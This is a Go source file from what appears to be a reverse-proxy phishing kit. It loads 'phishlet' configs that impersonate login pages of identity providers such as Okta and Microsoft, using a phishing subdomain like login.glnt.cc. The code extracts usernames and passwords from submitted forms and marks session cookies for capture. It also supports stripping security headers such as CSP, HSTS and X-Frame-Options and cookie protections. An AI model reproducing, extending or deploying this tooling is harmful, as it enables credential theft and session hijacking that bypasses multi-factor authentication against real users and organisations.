package main

import (
	"embed"
	"encoding/json"
	"log"
	"net/url"
	"strings"
)

//go:embed phishlets/*.json
var phishletFS embed.FS

// Phishlet defines a target identity provider's login flow.
type Phishlet struct {
	Name     string `json:"name"`
	Label    string `json:"label"`
	Upstream string `json:"upstream"`
	Hostname string `json:"hostname"` // our subdomain, e.g. login.glnt.cc

	// UpstreamHosts lists alternative upstream hosts this phishlet also handles.
	// Useful when a login flow redirects across multiple hosts
	// (e.g. login.live.com → login.microsoftonline.com).
	UpstreamHosts []string `json:"upstream_hosts"`

	ProxyPaths []string `json:"proxy_paths"`

	CredentialFields struct {
		Username []string `json:"username"`
		Password []string `json:"password"`
	} `json:"credential_fields"`

	SessionCookies []string `json:"session_cookies"`

	Rewrite struct {
		StripCSP           bool `json:"strip_csp"`
		StripXFO           bool `json:"strip_xfo"`
		StripHSTS          bool `json:"strip_hsts"`
		StripCookieSecure  bool `json:"strip_cookie_secure"`
		StripCookieDomain  bool `json:"strip_cookie_domain"`
		RewriteLocation    bool `json:"rewrite_location"`
	} `json:"rewrite"`
	PathMap map[string]string `json:"path_map"`
}

// loadPhishlets reads all JSON phishlet configs from the embedded filesystem.
func loadPhishlets() ([]Phishlet, error) {
	entries, err := phishletFS.ReadDir("phishlets")
	if err != nil {
		return nil, err
	}
	var phishlets []Phishlet
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".json") {
			continue
		}
		data, err := phishletFS.ReadFile("phishlets/" + e.Name())
		if err != nil {
			log.Printf("[phishlet] read %s: %v", e.Name(), err)
			continue
		}
		var p Phishlet
		if err := json.Unmarshal(data, &p); err != nil {
			log.Printf("[phishlet] parse %s: %v", e.Name(), err)
			continue
		}
		log.Printf("[phishlet] loaded %s (%s)", p.Name, p.Label)
		phishlets = append(phishlets, p)
	}
	return phishlets, nil
}

// matchPhishlet finds the phishlet whose upstream host suffix-matches the given URL.
// For Okta (upstream: okta.com), this matches acme.okta.com, bigcorp.okta.com, etc.
// Also checks UpstreamHosts for multi-host phishlets (e.g. login.live.com + login.microsoftonline.com).
func matchPhishlet(phishlets []Phishlet, upstreamURL string) *Phishlet {
	u, err := url.Parse(upstreamURL)
	if err != nil {
		return nil
	}
	for i := range phishlets {
		if hostMatchesHost(u.Host, phishlets[i].Upstream) {
			return &phishlets[i]
		}
		for _, uh := range phishlets[i].UpstreamHosts {
			if hostMatchesHost(u.Host, uh) {
				return &phishlets[i]
			}
		}
	}
	return nil
}

// hostMatchesHost checks whether requestHost matches a phishlet host entry (which may be a full URL or bare hostname).
func hostMatchesHost(requestHost, phishletHost string) bool {
	// phishletHost may be a full URL; extract the host portion.
	if u, err := url.Parse(phishletHost); err == nil && u.Host != "" {
		phishletHost = u.Host
	}
	return strings.EqualFold(requestHost, phishletHost) ||
		strings.HasSuffix(strings.ToLower(requestHost), "."+strings.ToLower(phishletHost))
}

// shouldProxy returns true if the request path should be proxied (matches a proxy_path prefix).
func (p *Phishlet) shouldProxy(reqPath string) bool {
	for _, prefix := range p.ProxyPaths {
		if strings.HasPrefix(reqPath, prefix) {
			return true
		}
	}
	return false
}

// extractUsername tries each configured username field against the POST body.
func (p *Phishlet) extractUsername(body string) string {
	for _, field := range p.CredentialFields.Username {
		if v := extractFormField(body, field); v != "" {
			return v
		}
	}
	return ""
}

// extractPassword tries each configured password field against the POST body.
func (p *Phishlet) extractPassword(body string) string {
	for _, field := range p.CredentialFields.Password {
		if v := extractFormField(body, field); v != "" {
			return v
		}
	}
	return ""
}

// isSessionCookie returns true if the cookie name is in the phishlet's session list.
func (p *Phishlet) isSessionCookie(name string) bool {
	for _, sc := range p.SessionCookies {
		if strings.EqualFold(name, sc) {
			return true
		}
	}
	return false
}

// allUpstreamHosts returns every host this phishlet handles (primary Upstream + UpstreamHosts).
func (p *Phishlet) allUpstreamHosts() []string {
	hosts := []string{}
	if u, err := url.Parse(p.Upstream); err == nil && u.Host != "" {
		hosts = append(hosts, u.Host)
	}
	for _, uh := range p.UpstreamHosts {
		if u, err := url.Parse(uh); err == nil && u.Host != "" {
			hosts = append(hosts, u.Host)
		}
	}
	return hosts
}
